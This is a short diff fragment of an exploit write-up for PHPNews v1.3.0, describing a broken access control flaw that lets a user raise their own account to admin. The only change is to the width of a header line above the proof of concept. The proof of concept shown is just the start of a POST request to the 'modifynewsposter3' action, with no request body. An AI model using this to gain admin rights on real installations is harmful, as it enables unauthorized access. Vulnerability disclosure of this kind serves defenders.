@@ -7,7 +7,7 @@
 ## Exploit Description:
 ## PHPNews v1.3.0 suffers from BOPLA - Broken Access Control Vulnerability allowing attackers to change his access type to admin(vertical privilege escalation).
 
-## -----------------------------------------------POC-------------------------------------------------------------------
+## ---------------------------------POC-----------------------------
 ```
 POST /index.php?action=modifynewsposter3 HTTP/1.1
 ...
